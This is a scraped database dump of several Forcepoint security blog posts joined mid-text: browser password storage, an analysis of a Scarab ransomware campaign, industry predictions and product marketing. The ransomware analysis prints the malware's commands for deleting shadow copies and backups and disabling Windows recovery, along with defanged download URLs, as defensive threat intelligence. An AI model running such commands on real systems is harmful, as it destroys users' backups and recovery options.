from prying eyes. Uptake of these services is outside the scope of this blog, but modern web browsers can be considered as minimalistic password keepers as well – and are frequently targeted by \'stealer\' malware.\n\nSticky-Notes, Text Files, and Encryption \n\nBefore we take a look at how some popular browsers do it, let\'s consider how passwords should be stored. \n\nHopefully everyone reading this blog knows not to write passwords down on sticky notes, but potentially few people dwell for long on how their passwords are stored electronically. Similar to the difference in perception between a physical key and a password, it’s often easy to forget that saving a password is effectively writing it down electronically. \n\nPlain text needs no further explanation: this is effectively the electronic equivalent of a sticky-note, whoever has access to the file can just read our password. \n\nPasswords are, therefore, generally hashed. Hashing the password means that the value stored is the output of a one-way transformation and cannot be reversed: when something needs to verify your password it hashes the value you entered and compares it to the one stored, thus negating the needs for the storage to be reversible. \n\nUnfortunately, to retrieve a password where only a hash is available is not always that difficult. Owing to the fact that the hash (be it MD5, SHA1, SHA256, etc.) of a given piece of text will always be the same, it is possible to work backwards from these to plain text values for common passwords very easily - tables of known hashes for common passwords exist for this purpose. This is at least part of the reason why people have long been advised not to use obvious passwords like ‘abracadabra’ and ‘opensesame’.  \n\nSecure local storage therefore incorporates a number of additional steps such as cryptographic salts and peppers, with extra layers of protection (i.e. asymmetric public/private key encryption) for any passwords in transit.\n\nBrowser Implementations \n\nSo how difficult is it to steal passwords from a browser? We looked at Firefox and Chrome, two of the most popular browsers of 2017, both of which provide simple solutions for saving passwords for internal and external sites.  \n\nFirefox \n\nUnless a site is added to its exceptions list, Firefox will ask whether we want it to save passwords for a given web site. If we opt to save our password, data will be stored in an encrypted file named ‘logins.json’ under our profile. Unfortunately, the decryption key is stored in a separate file called ‘key3.db’ which is kept in the same directory. \n\nThat said, there is the additional ability to encrypt saved passwords further by providing a master password. This results in a new popup window asking for our master key the first time a user wishes to use a saved password, after which there won\'t be another master password prompt in the same session until we restart the browser.  \n\nAssuming a strong master password is chosen – any wannabe thief would need both of the data files and to learn the master password to retrieve the saved credentials.\n\nNOTE: Both of the examples in the screenshots below are for a dummy account created for testing purposes.\n\n\n\nChrome \n\nChrome\'s password manager implementation is very similar to Firefox\'s offering, with a small exception, by default it is lacking a built-in master password feature. As such, if Chrome is the browser of your choice - and you like to save passwords within your browser - we highly recommend getting a plugin which provides similar functionality. \n\nChrome used to take advantage of security features provided by the OS, however, in a default Windows environment, passwords are now stored in a SQLite database file called ‘Login Data’. Similar to Firefox, attackers with local access will be able to gather the additional encryption keys to decrypt the contents of the ‘Login Data’ database.\n\n\n\nRecommendations: Usability vs Security \n\nThere will be always a trade-off between usability and security: our desire for the former means that we want to access our favourite services with just a few clicks, but the reality is that we need the latter to ensure we can trust in these services. \n\nSo, what shall we do? As noted earlier, there are any number of third-party credential management tools aimed at both consumers and businesses, the suitability of which is outside of the scope of this blog. \n\nAlternatively, by choosing our passwords carefully we can ensure that they are memorable and secure. Many people are already familiar with the concept of a passphrase such as: \n\n\nMyDog’sNameIsRuffles\n\nThis password has 114 bits of entropy (as estimated by KeePass). While these are all dictionary words, running lots of them together makes a brute-force attack take much longer and reduces the chance that someone else has already used the same combination before (i.e. the likelihood that the hash will appear in an already-cracked table somewhere). \n\nTo compare, the following has only 50 bits of entropy:  \n\n\nS7ng0pl! \n\nImproving further on this, there are static aspects of web sites and services - such as the URL, title or domain - which could act as a manual-but-memorable ‘salt’ to our existing passwords. Picking or generating a strong ‘core’ password or passphrase and enriching it with such a pre or post fix can result in different passwords for every site, yet ensure that remembering it is simple enough and we won’t be tempted to save it.  \n\nWith the extra \'salt\' on the end, this password now has 167 bits of entropy: \n\n\nMyDog’sNameIsRuffles$4PhotoStorage \n\nFinally, remember that credentials can still and do get stolen by other means. Combining a strong password with two-factor authentication (2FA) can effectively stop thieves in their tracks: even if they succeed in acquiring your now-supercharged password, they lack the second factor to get into your account. \n\nUnfortunately, many websites have yet to offer 2FA and, even worse, they often have a weak password policy – would you really trust someone accepting \'12345678\' as your password or denying \'MyDog’sNameIsRuffles\' (NOTE: 1) due to containing a special character? It\'s up to us to ensure that we have a strong password, but it may well be time to consider rejecting services which don\'t support us with this.\n\nConclusion: Why All of this Matters \n\nIn short: because passwords are the proverbial ‘keys to the kingdom’ for most people. \n\nIn 2017 NIST updated their guidance on passwords to recommend against draconian password changing frequencies and complexity rules, mostly because they do little to combat credential theft and may, in the worst cases, drive users to insecure storage of their hard-to-remember passwords.  \n\nFor home users, data protected by passwords will be everything from holiday photos to sensitive personal data which could potentially expose them to blackmail or financial fraud. For business users, the same issues exist but with the added concern that credential theft is a common way for IP thieves to impersonate authorised users. \n\nWhile solutions such as Forcepoint UEBA can be used to identify unusual patterns of behaviour associated with stolen credentials, prevention has always been and always will be preferable to post-hoc detection. \n\nAttackers will continue to focus on the human point of interaction with systems, and until weak password habits – in terms of password choice, storage, and policies – cease to be an easy line of attack, they will remain a prime target. \n\nIt can be easy to look at the myriad ways credential theft takes place and find oneself quite resigned, but it is entirely possible to make a difference: after all, if the safe only contains a blank piece of paper, what was the point in stealing it? \n\n(NOTE 1): The author’s dog’s name is not Ruffles.', 'https://www.forcepoint.com/blog/security-labs/vesting-browsers-our-trust\n');

However, this was followed by region-specific TLDs for the United Kingdom, Australia, France, and Germany:\n\n\n\n\nFigure 2: Target TLD distribution for Scarab malicious email\n\n\nThe email uses the subject “Scanned from {printer company name}” – a theme that is known to have been utilised for previous Locky ransomware campaigns distributed via Necurs. The email contains a 7zip attachment containing a VBScript downloader.\n\n\n\n\nFigure 3: Sample malicious email\n\n\nAs has been previously observed in Necurs campaigns, the VBScript contained a number of Game of Thrones references, in particular the strings “Samwell” and “JohnSnow”:\n\n\n\n\n\n\nFigure 4: \'Game of Thrones\' references within malicious VBScript\n\n\nThe download domains used as part of this campaign were compromised sites which have previously been used by Necurs-based campaigns.\n\nScarab Ransomware\n\nThe payload itself - Scarab - is a relatively new ransomware family that was discovered in June by Michael Gillespie. In the particular variant observed being distributed today, the ransomware drops the following copy of itself upon execution:\n\n\n%Application Data%\\sevnz.exe\n\n\nIt then creates a registry entry as an autostart mechanism:\n\n\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\nuSjBVNE = \"%Application Data%\\sevnz.exe\n\n\nOnce installed it proceeds to encrypt files, adding the extension “.[suupport@protonmail.com].scarab” to affected files. A ransom note with the filename “IF YOU WANT TO GET ALL YOUR FILES BACK, PLEASE READ THIS.TXT” (Figure 5, below) is dropped within each affected directory. The misspelling of \"support\" is present in both the modified filenames and the ransom note, and is presumably a result of the availability of email addresses on the Protonmail service.\n\nUnusually, the note does not specify the amount being demanded, instead simply stating that \"the price depends on how fast you write to us\". This note is also automatically opened by the malware after execution.\n\n \n\n\nFigure 5: Ransom message displayed by Scarab malware\n\n\nThe use of an email-based payment system has been observed in a number of campaigns already this year (most notably the NotPetya attack in June) and proven – for both the malware authors and victims – to be a potential single point of failure in the payment system, with providers often moving quickly to shut down the addresses associated with ransomware campaigns. In the case of Scarab, it appears that this possibility has been considered already, with the ransom note providing a secondary contact mechanism via BitMessage should the email address become unavailable.\n\nWhen running, Scarab executes the following commands to disable default Windows recovery features:\n\n\ncmd.exe /c wbadmin DELETE SYSTEMSTATEBACKUP -keepVersions:0\ncmd.exe /c wmic SHADOWCOPY DELETE\ncmd.exe /c vssadmin Delete Shadows /All /Quiet\ncmd.exe /c bcdedit /set {default} recoveryenabled No\ncmd.exe /c bcdedit /set {default} bootstatuspolicy ignoreallfailures\n\n\nFinally, once the encryption process is complete, it deletes the original copy of itself. \n\nProtection Statement\n\nForcepoint customers are protected against this threat via TRITON® ACE at the following stages of attack:\n\nStage 2 (Lure) - Malicious e-mails associated with this attack are identified and blocked.Stage 5 (Dropper File) - Scarab variants are prevented from being downloaded. \n\nConclusion\n\nBy employing the services of larger botnets such as Necurs, smaller ransomware players such as the actors behind Scarab are able to run a massive campaign with a global reach. It remains a question whether this is a temporary campaign, as was the case with Jaff, or if we will see Scarab increase in prominence through Necurs-driven campaigns.\n\nEither way, as we noted in our recent 2018 Security Predictions, we can expect ransomware to continue to make up a significant portion of the threat landscape for some time to come.\n\nAs always, Forcepoint Security Labs will continue to monitor developments to this threat and provide updates as necessary.\n\nIndicators of Compromise\n\nVBScript SHA-256\n\n\nc7e3c4bad00c92a1956b6d98aae0423170de060d2e15c175001aaeaf76722a52\n\n\nScarab SHA-256\n\n\n7a60e9f0c00bcf5791d898c84c26f484b4c671223f6121dc3608970d8bf8fe4f\n\n\nDownload locations\n\n\nhard-grooves[.]com/JHgd476?\npamplonarecados[.]com/JHgd476?\nmiamirecyclecenters[.]com/JHgd476?', 'https://www.forcepoint.com/blog/security-labs/massive-email-campaign-spreads-scarab-ransomware\n');

It seems like just moments ago that I was working with the team on where we thought 2017 was going. For me – and I expect for you too - the year has gone by in a flash, largely because of just how busy it’s been.\n\n\n\n	Even though I firmly believe that the way to see into the future is to know the past (something that we, as an industry, don’t tend to be very good at, but that’s another post entirely – you ignore history at your peril!), today I’m going to focus entirely on the future, and where I think we’re going.\n\n\n\n	To that end, I rifled through the report and picked out a few of my favorite predictions. Only when I was done writing this did I realize that they share a common theme: they all are directly or tangentially related to privacy. Given the work I’ve been doing over the last few months, I suppose I should not be surprised. In fact, I’d call that outcome a “predictable surprise,” an expression I am shamelessly stealing from a longtime friend and colleague (hello, Ronda!).\n\n\n\n	As Ronda would say it, a predictable surprise occurs when we behave as if we were startled by something, when in actuality it was obviously going to happen. While I know that it’s easy to construct a story showing how obvious certain outcomes are after the fact, there really are such things as predictable surprises in security – and I think there’s two predictions in this year’s report that fit this category: the rise in SSL, and the inevitability of GDPR.\n\n\n\n	The ticking clock of GDPR\n\n\n\n	I’ll start with what’s got to be the most predictable surprise in 2018: GDPR will land, and there’s going to be companies that aren’t ready. Although we’ve observed considerable discussion around compliance as the clock ticks down, we’re going to transition into an implementation phase. It’s not smart to procrastinate as we plan, and then be caught up in a huge (and messy) rush to implement – potentially at a pace that is too fast for comfort. The panic coming is a very predictable surprise; the smart CISO would do well to make sure they are ahead of this particular curve, working backward from where the technology controls have to be in place and operational. If the requirements from your legal team haven’t hit your desk yet, it’s already too late.\n\n\n\n	I’ll take a webpage, please, with a side order of SSL\n\n\n\n	Another thing we must plan for are the implications of ubiquitous encryption. While encryption sounds like a good thing, it’s very much a double-edged sword, as encryption hides the content to everyone, good guy and bad guy alike. Thus, as more of the web runs over SSL, the need to carry out traffic inspection is going to collide with both workload (examining an encrypted stream is much harder than an unencrypted one) and privacy. My connection to my bank is encrypted precisely because I don’t want anyone peering into those particular packets, thank you very much.\n\n\n\n	And an extra helping of privacy\n\n\n\n	One of our most interesting – but riskiest – predictions for 2018: the “privacy wars,” AKA when privacy becomes a top-of-mind issue for ordinary folks. Why risky? Not because I don’t believe it’s going to happen (I’m convinced it will), but because timing the change is hard. Maybe 2018, maybe a little later, but it is going to happen.\n\n\n\n	One of the big triggers is, of course, the highly-publicized MOAB (Mother of All Breaches), Equifax. Here, the question is not whether it was egregious or not, or even the amount of people impacted – it’s the fact that suddenly who holds data on you is personal because it impacts your day-to-day life. Essentially, it moves the discussion from the abstract to the concrete. That, coupled with GDPR, is going to drive a lot of discussion and, sadly, much of that conversation will be based upon gross oversimplification of the issues. Privacy is a highly-nuanced topic, and so cannot be meaningfully explored in 30-second soundbites. We run the risk of doing as much harm as good trying to “fix” the perceived tension between privacy and security, and I’m hoping that in this case, forewarned is forearmed. We need to have a real conversation about all things privacy, but should not just react to the environment. Instead we must shape it. \n\n\n\n	For the rest of our predictions, I hope that you download the report and read it. Moreover, I sincerely hope you enjoy rolling some of these ideas around in your head as much as the team enjoyed putting them together, and that these predictions help you make plans to be ready for what 2018 will bring. Oh, on that note, one closing bonus prediction not in our report: I bet we missed something important. I guess now I’m going to worry about what that was.', 'https://www.forcepoint.com/blog/insights/predictable-surprises\n');

The Entity Timeline was created by our designers, data scientists, and engineers in close collaboration with customers and prospects who have struggled with other timeline visualizations on large data sets and were looking for a better approach to easily and effectively understanding analytic results on user activity over time.  From a technical perspective, the purpose of the Entity Timeline is to show results for a single entity in a 24-hour period and to highlight what that entity was doing that caused him or her to score in a particular way for a given use case or analytic scenario. From a user value perspective, we are fundamentally changing the way security analysts can consume and interact with a UEBA platform to efficiently understand risk, investigate the risk presented, and then take action based on the findings.\n\n\n\n	\n\n\n	I want to highlight some of the unique capabilities of the Entity Timeline in the Forcepoint UEBA product and why this approach is fundamentally different:\n\n\n\n		Ability to Rapidly Pivot Timeline Between Risk Scenarios. Forcepoint UEBA analyzes user activity across a variety of risk scenarios – Data Exfiltration, Misconduct Behavior, Compromised User, to name a few. The new Entity Timeline allows systems user to easily pivot between risk scenarios for a given entity and see the corresponding user activity contributing to their scenarios and overall risk calculations. We know that a single risk score for an entity does not accurately reflect the complexity of human behavior. Enabling an analyst to pivot between risk scenarios aligns more closely with actual entity activity that could present risk. The Entity Timeline is truly at the forefront of Forcepoint\'s Human Point approach to security.\n	\n	\n		Intuitive Drilldown from Scenario Risk Scores to Contributing Activity. Our design and data science teams worked in close collaboration with end users to ensure that we are providing the optimal views into all levels of analytic results and underlying data to enable system users to quickly make decisions. Enabling an analyst to efficiently triage and investigate anomalous activity at multiple levels of analysis – from aggregation of user activity over time to individual events identify as risky or anomalous – is also fundamental to Forcepoint UEBA\'s overall approach to workflow.\n	\n	\n		Ability to Handle and Visualize Diverse Datasets. Many timeline visualizations look great in a demo environment but quickly breakdown in real-world, production deployments where the volume, variety and velocity of data can be messy. A core tenant in the design and development of the Forcepoint UEBA Entity Timeline is the ability to provide actionable results in any deployment – without binding customers to strict rules around data volume, variety and velocity. Since its inception, our platform has been differentiated by the ability to handle a variety of data types – structured and unstructured – and we continue to build this core differentiator into every new feature.\n	\n	\n		Transparency and Understandability of Analytic Results. When it comes to analyzing human-generated data and producing risk calculations, we firmly believe analytic results must be explainable. A black box approach to identifying anomalous and risky user behavior makes remediation challenging. The Forcepoint UEBA Entity Timeline introduces numerous concepts to help system users understand the analytic results they are viewing – from our new approach to concisely summarizing event information to explaining analytic results for each period of the timeline. We want to ensure analysts not only have a holistic picture of entity activity but also an understandable set of results.\n	\n\n	These are a few of the unique capabilities that we are introducing on the Forcepoint UEBA\'s new Entity Timeline.

With the Human Point System, we offer purpose-built solutions to provide a next generation cybersecurity solution.\n\n\n\n	The human point is the intersection of people, networks and data. At Forcepoint, our mission is aligned with our customers to focus on protecting organizations and the people they represent and serve by protecting against data losses and breaches. So, how do you secure a world in which the perimeter has all but vanished, and the attack surface continues to spread? We do this by focusing on human behavior and intent.\n\n\n\n	Too many cybersecurity solutions are based on a yes or no, black or white system of decision-making. But at Forcepoint we understand that people aren’t built that way. Human behavior is never black and white, circumstances are fluid, and people aren’t made of 1s and 0s. An intelligent cybersecurity framework should be nuanced, like the people it is designed to protect. This is what we mean when we say that the Human Point System is focused on the rhythm of your people and the flow of your data.\n\n\n\n	By protecting the human point, Forcepoint is securing regulated data everywhere people work, protecting intellectual property with visibility and control over how people create, move, and use data, and adapting those protections based on user risk by analyzing user behavior and the value of the data they touch.\n\n\n\n	We know our customers are on a journey to get to the best level of security possible – and we recognize that it’s a process. Forcepoint’s Human Point System capabilities are developed with that in mind, so wherever you are on your journey we can help you make a confident next step. You might choose to implement a single product (Forcepoint DLP for example) or multiple, integrated technologies that fit within an existing cybersecurity environment (perhaps by adding Forcepoint UEBA capabilities to understand human behavior across the network and flag anomalies in real time). Or, a customer may choose to add Forcepoint CASB with DLP for the ability to discover and protect data in the cloud and control access to cloud apps, and then add UEBA over time.

This was the founding principle of our next generation firewall, and today we’re pleased to announce yet more proof that Forcepoint NGFW is the industry’s strongest network security device. It’s also another example of how good things often come in threes, as we’ll see at the end.\n\n\n\n	Highest-Rated Security Effectiveness on 2017 NSS Labs NGIPS Test\n\n\n\n	There’s a gaping difference between hype and reality in the network security market that has never been more clear. Many vendors claim to deliver strong security, but Forcepoint has the proof. Once again, Forcepoint NGFW excelled in security effectiveness. This time it’s in NSS Labs’ 2017 Next Generation Intrusion Prevention System (NGIPS) Test, the leading independent examination of IPS systems.\n\n\n\n	\n\n\n	Of the nine products they tested, Forcepoint NGFW:\n\n\n\n		Blocked 99.91% of all exploits (there were just 3 misses, which we  updated dynamically within hours)\n	\n	\n		Blocked 100% of all 157 evasions tested\n	\n	\n		Had one of the lowest total cost of ownership (TCO) scores\n	\n	\n		Received NSS Labs’ coveted “RECOMMENDED” rating yet again\n	\n\n	2nd Year in a Row that Forcepoint NGFW Outperformed Even Special-Purpose IPS Devices\n\n\n\n	In this year’s NGIPS Test, NSS Labs tested nine different products, including a variety of dedicated IPS-only boxes. Forcepoint NGFW achieved a 99.9% security effectiveness score, the second year in a row we\'ve scored over 99%. \n\n\n\n	But, unlike many firewalls that require add-on blades or expensive licenses, Forcepoint NGFW includes the full power of its IPS at no extra charge. And, we also provide full firewall capabilities, VPN connectivity that can be set up in minutes, multi-link network clustering, and interactive dashboards that provide visibility all throughout your network – from your data centers and office networks to branch locations and the cloud.\n\n\n\n	Forcepoint Excels in Security Against Evasions, Exploits, and Malware\n\n\n\n	NSS Labs tests are so important because they provide one of the most realistic measures of what products are likely to face in the real world. This year, NSS Labs increased their focus on evasion techniques, the methods that attackers use to disguise exploits and malware. Many vendors tout their ability to catch exploits, but only if those exploits aren’t obscured by evasions. As NSS Labs points out:\n\n\n\n	“Failure of a security device to correctly identify a specific type of evasion potentially allows an attacker to use an entire class of exploits for which the device is assumed to have protection. This renders the device virtually useless. Many of the techniques used in this test have been widely known for years and should be considered minimum requirements for the NGIPS product category.\n\n\n\n	Providing exploit protection results without fully factoring in evasion can be misleading.”\n\n\n\n	– NSS Labs, Next Generation Intrusion Prevention System (NGIPS) Test Report, p. 8\n\n\n\n	The Security Value Map that NSS Labs published with the test illustrates just how misleading such claims about exploit protection can be. In the absence of evasions, all of the products did relatively well in catching exploits. However, once evasions were turned on, the effectiveness of all but four products dropped significantly. When this happens, attackers can pass right through the security device to deliver exploits to their targets. This puts any unpatched systems at risk from even older, well-known exploits, let alone zero-day attacks.\n\n\n\n	Why does Forcepoint do so well against evasions? Well, we literally wrote the book on them (Advanced Evasion Techniques for Dummies) and we offer the industry’s only software-based, ready-made evasion test lab, Evader. We see them as one of the three things that modern network security must protect against in order to defeat exploits and malware.

War                                             A\n\nWe predicted that both offensive and defensive cyber operations would become as important as physical weapons during actual conflict. We spoke about the rise of “cyber terrorists,” which would become a growing problem, and a potential target for military operations as enemies of the state. Cyber terrorism can also take the form of nation states interfering in elections, as recent reports assert. Further underlining the importance of this, the US Government decided in January 2017 to formally designate election infrastructure as part of critical infrastructure.\n\nThere were several incidents this past year which support the notion of disruptive or destructive cyber attacks to support political objectives: the alleged interference in both the U.S. and German elections; claims such as those made by Qatar against the UAE; and claims made by Indian activists against Pakistan government websites. Concrete attribution is still a problem in each of these cases, and even with some security firms pointing at North Korea as the culprit behind Wannacry, definitive blame remains difficult to prove.\n\nMillennials in the Machine                                                                                         C\n\nMillennials are projected to make up 75 percent of the workforce by 2025*. We predicted that accidental data breaches would become more common as millennials entered and changed the cultural norms of the workplace. The quantity of data breaches has certainly risen, but we have found it hard to consistently prove a correlation between the age of the individual responsible for the breach, and the breach itself.\n\nThere are some examples such as the junior software developer who posted on Reddit that he or she accidentally deleted an entire critical database, but as the individuals behind data breaches usually remain anonymous, our assumptions remain unproven.\n\nHowever, we can point to changing attitudes to technology and privacy, which we believe poses a risk to enterprises. Raytheon and Forcepoint recently collaborated on a survey, Securing Our Future: Cybersecurity and the Millennial Workforce, which highlights risky behaviors from millennials. In the month previous to the survey, 77 percent had connected to unprotected Wi-Fi and 42 percent shared a password with a non-family member during the year. Another survey showed only 26 percent of university students said they were aware of any breaches at their schools. Considering the prevalence of BYOD policies in enterprises, these attitudes clearly pose significant risks.\n\nFor this prediction, we give ourselves a C. We said organizations need to get ahead of the security curve by adopting technology that puts context around employee behavior to distinguish between harmless or accidental behavior and risky or malicious employee activity. While the quantity of data breaches continues to rise, the insider threat remains a plausible attack vector arising from all employees, not just millennials.\n\n* According to population estimates by the U.S. Census Bureau and Pew Research Center \n\nCompliance and Data Protection Convergence                                                     A\n\nWe are now nearing the deadline of the European Union’s (EU) General Data Protection Regulation (GDPR) becoming a legal requirement, with enforcement beginning in May of 2018. We predicted that corporate and social responsibility for protecting personally identifiable information (PII) would converge, becoming a reality for organizations of all sizes. We also said that, beginning in 2018, the new, true impact of a data breach would be re-examined prior to increased sanctions for non-compliance incidents. We said that the impact would be felt most by large enterprises that had not prepared going into 2017.\n\nThe industry could not have asked for a larger impact to drive home the importance of GDPR compliance than the Equifax breach, which revealed the personal and irreplaceable private data of 145 million U.S. citizens. And while most of the breach mostly affected U.S. citizens, 15.2 million records belonged to British and Canadian citizens. The British ICO and U.S. Congress are now asking Equifax for answers; it’s clear that the industry is sitting up and taking notice. If this happened a mere eight months later, the outcome for Equifax could have been significantly different.  We are finding that organizations are driving towards improving their data protection strategies, in order to reduce the risk of a breach and the accompanying larger fines if they’re proven to be negligent.\n\nRise of the Corporate-Incentivized Insider Threat                                                 B-\n\nWe predicted that more cases of corporate-incentivized insider abuse of PII would come to light.  We thought that it might create a new definition of insider threat, where the organization inappropriately leverages customer data to meet corporate profit expectations and other performance goals. \n\nWe were close, but again examples are scarce. There were two cases in 2017 where courts found companies guilty of falsifying customer data to make money – US-based home healthcare provider Dynamic Visions and a group of US physicians fraudulently manipulating patient records. In addition, British-based Verso Group was fined over $100,000 for selling on people’s personal data for marketing purposes without appropriate permissions.\n\nIn addition, we continue to see commercially sensitive data extracted from one organization to another. What is different this year is an improvement in the tracking systems of organizations allowing for this activity to be identified sooner and, in some cases, legally challenged.\n\nFor example, Uber is currently in the middle of a trade theft case brought on by Google, who claims that Uber’s laser sensor tech for self-driving cars is based on data stolen by a former Google engineer who later became an Uber executive. Another case involves a U.S.-based salesperson who, after leaving one company for a role at another, continued to access the former company’s databases, essentially committing corporate espionage.\n\nTechnology Convergence and Security Consolidation 4.0                                    B-\n\nWe predicted that companies not taking part in industry convergence — unless they received additional venture capital — would be more likely to exit the industry as a result of vendor consolidation. Security-related mergers and acquisitions continue to take place; we acquired UEBA specialist RedOwl in August 2017 and Skyfence in February 2017.\n\nWe’re not the only company building up our portfolio. As City AM reported in July, not only are security acquisitions increasing but so are the prices of security-related businesses. Cybersecurity Ventures reported major acquisitions for 2017, with an expectation of more throughout the year: Microsoft bought Israeli company Hexadite for $100 million; CyberArk signaled their appetite for an  acquisition with a $42 million deal to take over DevOps security software company Conjur; Gemalto closed on one of the largest deals in the quarter with their $850 million purchase of 3M’s identity management business; and numerous small players got snapped up by the likes of Honeywell, EY, General Dynamics and Accenture.\n\nWe also said that security training and products focused on increasing security resources, such as sandboxing, could be the next big wave. The market has seen increasing popularity of SIEM technologies, which free up scarce and expensive personnel resources by reducing the signal-to-noise ratio, allowing people to focus on incidents that pose true threats to security. Gartner predicted that SIEM technologies would be among the fastest growing security technologies for 2017 and beyond.\n\nThe Cloud as an Expanding Attack Vector                                                              B\n\nIn 2017, we predicted a rise in hypervisor hacking, and stated that Denial of Service attacks would rise against cloud providers; this is a prediction which came close but had low impact. While there are plenty of known vulnerabilities in hypervisors, including the Xen project listing seven patches for hypervisor bugs, we are seeing low incidents of real-life examples when good practices are followed.\n\nWe also stated that organizations migrating their vulnerable environments to the cloud would experience reduced overall security if they relied solely on security within the cloud. To combat this, we also stated that hybrid security would become a popular method to protect data wherever it is used or accessed. This is happening — in addition, it has become necessary for businesses to better understand what visibility and control they have on that data, hence the rising demand for CASB and DLP solutions.\n\nAs organizations move to the cloud, access control and permissions mistakes are being made that can result in data being exposed publicly, as in the examples reported by Dark Reading and others.\n\nVoice-First Platforms and Command Sharing                                                         B\n\nWe predicted that the convergence of technologies would generate a new round of consolidation, and that the number of apps designed to leverage voice-activated commands AI (e.g. Siri, Alexa) would explode in 2017, creating a completely new threat vector.\n\nVoice-activated AI has indeed grown, with Google Home entering the market as an Amazon Alexa competitor; eMarketer predicts that voice-enabled speaker usage will grow 130 percent in 2017. Google Analytics has also added voice-activated analytics, giving differing forms of access to potentially sensitive data. While threats have not yet been realised, the opportunity exists and is growing.\n\nAI and the Rise of Autonomous Machine Hacking                                                 C\n\nWe predicted that widespread weaponization of autonomous hacking machines by threat actors would emerge in 2017, creating an arms race to build autonomous patching. We imagined self-directed hacking machines launched by rogue hackers or state actors to anonymize attacks, target and overwhelm rival national cyber defences, or trigger a response that would quickly evolve into geopolitical and economic crises. While we have not seen much movement in this space, the potential is still there. We think this prediction is still one to keep an eye on; if realized, the impact could be severe.\n\nRansomware Escalation                                                                                            A+\n\nWe gave our prediction about the explosion of ransomware an A+, unfortunately, since it negatively impacted so many people worldwide. If this were a 10-point scale, we’d have turned it up to 11.\n\nWe said that there should be no expectation ransomware would go away and that hackers would have to alter their current playbook, morphing ransomware to include data exfiltration techniques, in order to better capitalize on every hack.\n\nThe following are examples of disruptive ransomware which morphed and developed to achieve its aims.\n\nWannacry, May 2017 - The appearance of WannaCry in May of 2017 introduced worm-like capabilities to ransomware.  It was a milestone moment which spawned many derivatives seeking to spread quickly from organization to organization.\n\nJaff, May 2017 - Even with the attention paid to ransomware spreading via network vulnerabilities in the SMBv1 protocol, we must not forget about the traditional email lure; in Jaff’s case, this was observed at a rate of 4.5 million emails per hour. \n\nCradleCore, May 2017 - The RaaS (Ransomware as a Service) model did not work for the malware author, so instead it was offered for sale as source code, and others were later able to enhance it. CradleCore highlighted that code re-use and through modification generated a threat landscape of tomorrow different from that of today. \n\nPhiladelphia, June 2017 - This reinforced that particular industries are deemed more attractive to ransomware authors: healthcare and financial services have money and desire to get their files back, which results in increased ransom demands and targeting. \n\nPetya, June 2017 - Petya (aka NotPetya) initiated a debate on the motivation of the attackers: was the goal of Petya to wipe/destroy machines or to hold them to ransom?  The jury is still out, but Petya reinforced the message of seeking to understand the intent of the attacker, in order to best protect data or recover it in the most appropriate way.\n\nBad Rabbit, October 2017  - This brought home the importance of protecting businesses from drive-by downloads and training users to not interact with fake software updates.\n\nAbandonware Vulnerability                                                                                     A\n\nWe stated that we’d see more “abandonware,” (i.e., orphaned technologies), where owners stop supporting and upgrading their products. Petya (aka NotPetya) went even further. While compromised software wasn’t abandoned in this case, the original authors had lost control of the update servers; as a result, trusted automatic updates wrought havoc across the world.\n\nForcepoint had previously warned this could happen. Last year, we stated that IT security professionals and other security researchers relied upon out-of-date, unsupported legacy tools to reverse engineer programs for a variety of purposes. We expect to see more legacy, end-of-life abandonware vulnerabilities leading to data breaches.\n\nThis part of the prediction was proven recently with the so-called “KRACK”, where researcher Mathy Vanhoef released details of an attack against the WPA2 Wi-Fi security protocol, a protocol adopted since 2004. This is certainly a concerning discovery with far-reaching implications but there are mitigating factors: many applications such as online banking, accounting or even Facebook and Google use HTTPS to provide an additional layer of encryption. Attacks against HTTPS are not unheard of but would require the presence of additional vulnerabilities and effort on the part of an attacker to break.\n\nFinal Grade: B\n\nOverall, we’d give ourselves a solid B for this year’s work, as we were pretty close on many threats. In general, enterprise and government organizations must consider how the traditional perimeter has evolved and, in some cases, dissolved.

INSERT INTO `forcepoint` (`id`, `title`, `author`, `publishdate`, `content`, `url`) VALUES (40, 'High Profile Breaches, Jurassic Park and Chinese Takeout', 'Carolyn FordSean BergVinny SharmaForcepoint ', '\n      \n    \n      \n      \n   ', 'Securing data and people by understanding insider intent\n\n\n\n	In recent weeks and months, we’ve seen a slew of high profile breaches gain media and consumer attention. The SEC, Deloitte, Equifax and Bupa stories are just a few of these examples. For most people, two of the biggest questions that come to mind are: “How did this happen?” and “How am I affected?” At Forcepoint, we shift the focus to user intent, and ask “Why?”. We often hear that a vulnerability was left unpatched, or an inadvertent mistake led to the leak of confidential information. For those outside of the security industry, catastrophic data loss is often thought to be carried out by devious, malicious actors, such as those in action-packed TV dramas or movies. But reality is rarely so dramatic.\n\n\n\n	Take the movie Jurassic Park, for example. Dennis Nedry, the brilliant system architect, is a perfect Hollywood example of an insider threat who inflicts dire consequences. First and foremost, Nedry is not suspected by his employer of being an insider threat and has been granted physical and digital privileges within the park. This gives him tremendous opportunity to cause harm. Secondly, he colludes with the adversary to smuggle dinosaur eggs out of Jurassic Park inside a shaving cream can. Lastly, he sabotages the park’s systems to ensure he can continue to carry out his devious plan. This kind of scenario is probably the most common way insider threats are portrayed in mainstream television and film. However, this is also a very limiting and (mostly) inaccurate way of thinking about insider threat. The truth is, a Dennis Nedry situation, while possible, is in reality the least common type of insider threat.\n\n\n\n	Let’s circle back to reality. An insider can be any former or current user including: employees, partners, suppliers, contractors, board members and even customers. In other words, the insider threat can be anyone who has access to systems, confidential data, or IP. As we see in many high profile breaches, incidents often happen unintentionally by well-meaning employees, partners and contractors trying to do their job. In fact, according to a 2016 study, unintentional breaches are the most common type of insider threat and can be just as damaging. As we look at the entire cyber continuum of intent and behaviors of users, we see that protecting data is a much larger endeavor which must take into consideration the motivations of accidental and compromised, as well as malicious, insiders.\n\n\n\n	For example, Verizon’s breach is an unfortunate example of inadvertent error: it was due to a partner accidentally leaving 6 million records unprotected in the cloud.\n\n\n\n	Whenever I hear about cases like this I think, “Really, ‘accidentally’?” But consider all the people—employees, partners and customers—who have access to your data. These people may not know what is sensitive and what is not, and/or just don’t practice common-sense security.\n\n\n\n	With that being said, if you don’t think an insider breach could happen to you, consider this scenario:\n\n\n\n	At a supplier partner to a big pharma company, its Bob’s turn to pick lunch for his work group. He orders from his favorite Chinese restaurant online via their website. Food is delivered and the group carries on: shipping, emailing, signing contracts, sharing data, etc. Behind the scenes, unbeknownst to Bob, he was also served a side of malware which opened a back-door to the corporate network. The malware spreads by attaching itself to data that is shared beyond the network, opening up back-doors to every network the supplier shares data with, including the pharma company.\n\n\n\n	This example includes social engineering via 